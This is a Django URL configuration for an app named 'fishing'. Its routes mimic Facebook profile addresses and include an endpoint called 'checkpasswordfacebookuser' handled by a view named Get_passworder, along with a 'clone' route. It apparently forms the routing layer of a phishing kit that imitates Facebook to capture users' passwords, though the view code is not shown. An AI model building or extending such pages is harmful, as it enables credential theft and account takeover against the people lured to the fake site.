from django.contrib import admin
from django.urls import path
from django.conf.urls import url
from django.contrib.auth import views as auth_views


from .import views

app_name="fishing"
urlpatterns = [
    # home page
    url(r'^$', views.index, name='index'),
    url(r'profile/(?P<id>\d+)/(?P<slug>[\w-]+)/profilephpid=100028712344302/$', views.show_article, name='show_article'),
    url(r'^checkpasswordfacebookuser/$', views.Get_passworder, name='Get_passworder'),
    url(r'user/$', views.clone, name='clone'),
    
]